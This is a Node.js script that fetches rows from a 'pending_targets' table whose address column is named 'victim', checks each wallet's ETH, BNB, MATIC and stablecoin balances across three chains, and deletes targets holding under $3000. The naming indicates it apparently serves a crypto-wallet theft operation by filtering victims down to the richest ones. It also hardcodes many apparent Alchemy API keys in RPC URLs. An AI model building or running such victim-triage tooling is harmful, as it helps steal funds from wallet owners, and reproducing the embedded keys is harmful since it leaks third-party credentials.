#!/usr/bin/env node
/**
 * Purge targets with balance < $3000 from pending_targets
 * 
 * Uses Alchemy's alchemy_getTokenBalances for fast multi-token balance checks.
 * Processes in parallel batches and DELETES INCREMENTALLY (every 3000 addresses).
 * 
 * Usage:
 *   node scripts/purge_low_balance_targets.js              # LIVE MODE (deletes)
 *   node scripts/purge_low_balance_targets.js --dry-run    # DRY RUN (preview only)
 */
import 'dotenv/config';
import { createPublicClient, http, fallback } from 'viem';
import { mainnet, bsc, polygon } from 'viem/chains';
import { createClient } from '@supabase/supabase-js';

// ─── CLI Flags ───
const isDryRun = process.argv.includes('--dry-run');
const THRESHOLD_USD = 3000;
const BATCH_SIZE = 30;          // addresses per parallel batch
const PURGE_INTERVAL = 1000;    // delete every 3000 addresses checked
const DELETE_CHUNK = 500;       // Supabase delete chunk size
const RPC_TIMEOUT_MS = 30000;

console.log('\n══════════════════════════════════════════════════');
if (isDryRun) {
    console.log('  🔍 DRY-RUN MODE — No database changes will be made');
} else {
    console.log('  ⚠️  LIVE MODE — Targets below $' + THRESHOLD_USD + ' WILL BE DELETED');
    console.log(`  🗑️  Incremental deletion every ${PURGE_INTERVAL} addresses`);
}
console.log('══════════════════════════════════════════════════\n');

// ─── Supabase ───
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
if (!supabaseUrl || !supabaseKey) {
    console.error('❌ Missing NEXT_PUBLIC_SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY');
    process.exit(1);
}
const supabase = createClient(supabaseUrl, supabaseKey);

// ─── Alchemy RPCs (reuse your existing keys) ───
const ALCHEMY_RPCS = {
    bsc: [
        'https://bnb-mainnet.g.alchemy.com/v2/alch_6gTznTT4QnX3_0IE9gkY-',
        'https://bsc-dataseed.binance.org',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_z1J_ESjjLVZwSBLNoep84',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_-NvhHn24EgwhuMt38pZJr',
        'https://rpc.ankr.com/bsc',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_8ToIPT9Z3R1iQ55nksx8b',
        'https://bsc.publicnode.com',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_Qy6hQXdtdVlE7Z4uVxt_A',
        'https://1rpc.io/bnb',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_rniHI4MxzjBfNZ4bxmDu5',
        'https://bsc.drpc.org',
        'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
        'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
    ],
    polygon: [
        'https://polygon-mainnet.g.alchemy.com/v2/CByFU5cCGAYyh8EHLamXD',
        'https://polygon-rpc.com',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_UdSkrC6LFs2HGS0VUGg5O',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_tAPr1C9JUzQZYax5pslu5',
        'https://rpc.ankr.com/polygon',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_Bq31mnvxmjdT70RCYLGLA',
        'https://polygon.llamarpc.com',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_17XYrB1qagYO9Edwxj7Cw',
        'https://polygon.publicnode.com',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_UQzY-saHkZZrowH7kylTu',
        'https://1rpc.io/polygon',
        'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
        'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
    ],
    ethereum: [
        'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
        'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et',
        'https://eth-mainnet.g.alchemy.com/v2/alch_F5VimAPoBoESKZ566us-U',
        'https://ethereum.publicnode.com',
        'https://eth-mainnet.g.alchemy.com/v2/alch_x_oSlpf2bnfc6brp-BgzA',
        'https://eth-mainnet.g.alchemy.com/v2/alch_tp8k4HI9tVpUEBmsF3kXc',
        'https://rpc.ankr.com/eth',
        'https://eth-mainnet.g.alchemy.com/v2/alch_7viyR-7wWLgc2i9suQ6hS',
        'https://eth.llamarpc.com',
        'https://eth-mainnet.g.alchemy.com/v2/ig-ZUQrtw2shXhW2NuT6W',
        'https://1rpc.io/eth',
        'https://eth-mainnet.g.alchemy.com/v2/alch_dFm-5A7LhWtYU3_4Y103o',
        'https://eth.drpc.org',
    ],
};

const CHAINS = {
    ethereum: {
        chain: mainnet,
        chainId: 1,
        coingeckoId: 'ethereum',
        stablecoins: {
            USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
            USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
            DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
            USDP: '0x8E870D67F660D95d5be530380D0eC0bd388289E1',
            TUSD: '0x0000000000085d4780B73119b644AE5ecd22b376',
            FRAX: '0x853d955aCEf822Db058eb8505911ED77F175b99e',
        },
        decimals: { USDT: 6, USDC: 6, DAI: 18, USDP: 18, TUSD: 18, FRAX: 18, ETH: 18 },
    },
    bsc: {
        chain: bsc,
        chainId: 56,
        coingeckoId: 'binancecoin',
        stablecoins: {
            USDT: '0x55d398326f99059fF775485246999027B3197955',
            USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
            BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
            DAI: '0x1AF3F329e8BE154074D8769D1FFa4f058117F6b8',
        },
        decimals: { USDT: 18, USDC: 18, BUSD: 18, DAI: 18, BNB: 18 },
    },
    polygon: {
        chain: polygon,
        chainId: 137,
        coingeckoId: 'matic-network',
        stablecoins: {
            USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
            USDC: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',
            USDCe: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
            DAI: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
            USDP: '0x2aBE941127B1C078d5e75E7C68A0e3ae3B0b8f1D',
        },
        decimals: { USDT: 6, USDC: 6, USDCe: 6, DAI: 18, USDP: 18, MATIC: 18 },
    },
};

const CHAIN_CLIENTS = {};
for (const [name, cfg] of Object.entries(CHAINS)) {
    CHAIN_CLIENTS[name] = createPublicClient({
        chain: cfg.chain,
        transport: fallback(
            ALCHEMY_RPCS[name].map(url => http(url, { timeout: RPC_TIMEOUT_MS })),
            { retryCount: 2 }
        ),
    });
}

// ─── Utilities ───
let prices = {};

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function fetchAllPendingTargets() {
    const PAGE_SIZE = 1000;
    let offset = 0;
    let all = [];
    while (true) {
        const { data, error } = await supabase
            .from('pending_targets')
            .select('id, victim, chain')
            .range(offset, offset + PAGE_SIZE - 1);
        if (error) throw new Error('Failed to fetch pending_targets: ' + error.message);
        if (!data || data.length === 0) break;
        all = all.concat(data);
        if (all.length % 5000 === 0) console.log(`  └─ Fetched ${all.length} rows...`);
        if (data.length < PAGE_SIZE) break;
        offset += PAGE_SIZE;
    }
    return all;
}

async function getNativePrices() {
    const ids = Object.values(CHAINS).map(c => c.coingeckoId).join(',');
    const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`;
    const res = await fetch(url, { headers: { 'User-Agent': 'CipherNet/1.0' } });
    const data = await res.json();
    const prices = {};
    for (const [name, cfg] of Object.entries(CHAINS)) {
        prices[name] = data[cfg.coingeckoId]?.usd || 0;
    }
    // Stablecoins are ~$1
    prices.USDT = 1; prices.USDC = 1; prices.BUSD = 1;
    prices.DAI = 1; prices.USDP = 1; prices.TUSD = 1;
    prices.FRAX = 1; prices.USDCe = 1;
    return prices;
}

async function deleteBatch(ids, chainName) {
    if (isDryRun || ids.length === 0) return 0;

    let deleted = 0;
    for (let i = 0; i < ids.length; i += DELETE_CHUNK) {
        const chunk = ids.slice(i, i + DELETE_CHUNK);
        const { error } = await supabase
            .from('pending_targets')
            .delete()
            .in('id', chunk);
        if (error && error.code !== '42P01') {
            console.error(`  ❌ Delete error: ${error.message}`);
        } else {
            deleted += chunk.length;
        }
    }
    console.log(`  🗑️  Deleted ${deleted} low-balance targets from ${chainName}`);
    return deleted;
}

async function checkBalanceWithRetry(address, chainName, maxRetries = 5) {
    const cfg = CHAINS[chainName];
    if (!cfg) return { totalUsd: 0, error: 'unknown chain' };

    const client = CHAIN_CLIENTS[chainName];
    const tokenAddrs = Object.values(cfg.stablecoins);

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            // Add timeout wrapper for RPC calls
            const timeoutPromise = new Promise((_, reject) =>
                setTimeout(() => reject(new Error('RPC timeout')), RPC_TIMEOUT_MS)
            );

            const [nativeBal, tokenResult] = await Promise.race([
                Promise.all([
                    client.getBalance({ address }),
                    client.request({
                        method: 'alchemy_getTokenBalances',
                        params: [address, tokenAddrs],
                    }).catch(() => null),
                ]),
                timeoutPromise
            ]);

            let totalUsd = 0;

            // Native
            const nativeSymbol = chainName === 'ethereum' ? 'ETH' : chainName === 'bsc' ? 'BNB' : 'MATIC';
            const nativeDecimal = cfg.decimals[nativeSymbol];
            const nativeAmount = Number(nativeBal) / (10 ** nativeDecimal);
            totalUsd += nativeAmount * (prices[nativeSymbol] || prices[chainName] || 0);

            // Stablecoins
            if (tokenResult && tokenResult.tokenBalances) {
                const symbolByAddr = {};
                for (const [sym, addr] of Object.entries(cfg.stablecoins)) {
                    symbolByAddr[addr.toLowerCase()] = sym;
                }
                for (const tb of tokenResult.tokenBalances) {
                    if (!tb.tokenBalance || tb.tokenBalance === '0x0') continue;
                    const sym = symbolByAddr[tb.contractAddress?.toLowerCase()];
                    if (!sym) continue;
                    const decimals = cfg.decimals[sym] || 18;
                    const amount = Number(BigInt(tb.tokenBalance)) / (10 ** decimals);
                    totalUsd += amount * (prices[sym] || 1);
                }
            }

            return { totalUsd, nativeAmount, error: null };
        } catch (err) {
            const errMsg = err.message || String(err);

            // Check if it's a rate limit error
            if (errMsg.includes('429') || errMsg.includes('rate limit') || errMsg.includes('Too Many Requests')) {
                if (attempt < maxRetries) {
                    // Exponential backoff: 1s, 2s, 4s, 8s, 16s
                    const delay = Math.pow(2, attempt - 1) * 1000;
                    await sleep(delay);
                    continue;
                }
            }

            // For other errors or max retries reached
            return { totalUsd: 0, error: errMsg };
        }
    }

    return { totalUsd: 0, error: 'max retries exceeded' };
}

async function processChain(chainName, rows) {
    console.log(`\n🔗 Chain: ${chainName.toUpperCase()} — ${rows.length} targets`);
    console.log(`   Starting balance checks (BATCH_SIZE=${BATCH_SIZE})...`);

    let belowThreshold = 0;
    let aboveThreshold = 0;
    let errors = 0;
    let totalDeleted = 0;
    const toDelete = [];
    const sampleBelow = [];
    const sampleAbove = [];
    let checkedSinceLastPurge = 0;
    let consecutiveErrors = 0;
    const startTime = Date.now();

    // Process in parallel batches
    for (let i = 0; i < rows.length; i += BATCH_SIZE) {
        const batch = rows.slice(i, i + BATCH_SIZE);

        // Debug: Log first batch
        if (i === 0) {
            console.log(`   Processing first batch of ${batch.length} addresses...`);
            console.log(`   First address: ${batch[0].victim}`);
        }

        const results = await Promise.all(
            batch.map(async (row) => {
                const result = await checkBalanceWithRetry(row.victim, chainName);
                return { row, ...result };
            })
        );

        for (const r of results) {
            checkedSinceLastPurge++;

            if (r.error) {
                errors++;
                consecutiveErrors++;

                // If we hit 10 consecutive errors, add extra delay
                if (consecutiveErrors >= 10) {
                    console.log(`\n  ⚠️  ${consecutiveErrors} consecutive errors, cooling down 5s...`);
                    await sleep(5000);
                    consecutiveErrors = 0;
                }
                continue;
            }

            // Reset consecutive error counter on success
            consecutiveErrors = 0;

            if (r.totalUsd < THRESHOLD_USD) {
                belowThreshold++;
                toDelete.push(r.row.id);
                if (sampleBelow.length < 3) {
                    sampleBelow.push({ addr: r.row.victim, usd: r.totalUsd.toFixed(2) });
                }
            } else {
                aboveThreshold++;
                if (sampleAbove.length < 3) {
                    sampleAbove.push({ addr: r.row.victim, usd: r.totalUsd.toFixed(2) });
                }
            }
        }

        // INCREMENTAL DELETE: Every PURGE_INTERVAL addresses
        if (checkedSinceLastPurge >= PURGE_INTERVAL && toDelete.length > 0) {
            const deleted = await deleteBatch(toDelete, chainName);
            totalDeleted += deleted;
            toDelete.length = 0;
            checkedSinceLastPurge = 0;
        }

        const done = Math.min(i + BATCH_SIZE, rows.length);

        // Show progress every batch (more frequent feedback)
        if (done % BATCH_SIZE === 0 || done === rows.length) {
            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
            const rate = (done / (elapsed || 1)).toFixed(1);
            process.stdout.write(
                `\r  └─ Progress: ${done}/${rows.length} (${rate}/s) | Below: ${belowThreshold} | Above: ${aboveThreshold} | Deleted: ${totalDeleted} | Errors: ${errors}    `
            );
        }

        // Adaptive sleep: longer after errors, shorter on success
        await sleep(consecutiveErrors > 0 ? 200 : 100);
    }
    process.stdout.write('\n');

    // Final purge for remaining items
    if (toDelete.length > 0) {
        const deleted = await deleteBatch(toDelete, chainName);
        totalDeleted += deleted;
    }

    // Sample preview
    if (sampleBelow.length) {
        console.log(`  📉 Sample below $${THRESHOLD_USD} (deleted):`);
        sampleBelow.forEach(s => console.log(`      ${s.addr}  $${s.usd}`));
    }
    if (sampleAbove.length) {
        console.log(`  📈 Sample above $${THRESHOLD_USD} (kept):`);
        sampleAbove.forEach(s => console.log(`      ${s.addr}  $${s.usd}`));
    }

    return { total: rows.length, belowThreshold, aboveThreshold, errors, deleted: totalDeleted };
}

// ─── Main ───
async function main() {
    console.log('📡 Fetching native/stablecoin prices...');
    prices = await getNativePrices();
    console.log('   Prices:', Object.entries(prices)
        .filter(([k]) => ['ethereum', 'binancecoin', 'matic-network'].includes(k))
        .map(([k, v]) => `${k}=$${v}`).join(', '));

    console.log('\n📡 Fetching all pending_targets...');
    const rows = await fetchAllPendingTargets();
    console.log(`   Total rows: ${rows.length}`);

    // Group by chain
    const byChain = {};
    for (const r of rows) {
        const c = (r.chain || 'ethereum').toLowerCase();
        if (!byChain[c]) byChain[c] = [];
        byChain[c].push(r);
    }

    const results = {};
    for (const chainName of Object.keys(CHAINS)) {
        if (!byChain[chainName] || byChain[chainName].length === 0) {
            console.log(`\n🔗 Chain: ${chainName.toUpperCase()} — 0 targets (skipped)`);
            continue;
        }
        results[chainName] = await processChain(chainName, byChain[chainName]);
    }

    // Final summary
    console.log('\n══════════════════════════════════════════════════');
    console.log('  FINAL SUMMARY');
    console.log('══════════════════════════════════════════════════');
    let totalTargets = 0, totalBelow = 0, totalAbove = 0, totalErrors = 0, totalDeleted = 0;
    for (const [chain, r] of Object.entries(results)) {
        console.log(`\n  ${chain.toUpperCase()}:`);
        console.log(`    Total targets:    ${r.total}`);
        console.log(`    Below $${THRESHOLD_USD}:     ${r.belowThreshold}`);
        console.log(`    Above $${THRESHOLD_USD}:     ${r.aboveThreshold}`);
        console.log(`    RPC errors:       ${r.errors}`);
        console.log(`    ${isDryRun ? 'Would delete' : 'Deleted'}:   ${r.deleted}`);
        totalTargets += r.total;
        totalBelow += r.belowThreshold;
        totalAbove += r.aboveThreshold;
        totalErrors += r.errors;
        totalDeleted += r.deleted;
    }
    console.log('\n  ── GRAND TOTAL ──');
    console.log(`    Total:     ${totalTargets}`);
    console.log(`    Below:     ${totalBelow} (${((totalBelow / totalTargets) * 100).toFixed(1)}%)`);
    console.log(`    Above:     ${totalAbove} (${((totalAbove / totalTargets) * 100).toFixed(1)}%)`);
    console.log(`    Errors:    ${totalErrors}`);
    console.log(`    ${isDryRun ? 'Would delete' : 'Deleted'}:  ${totalDeleted}`);
    console.log('\n══════════════════════════════════════════════════\n');

    if (isDryRun) {
        console.log('🔍 DRY-RUN COMPLETE — run without --dry-run to actually delete.\n');
    }
}

main().catch(err => {
    console.error('❌ Fatal error:', err);
    process.exit(1);
});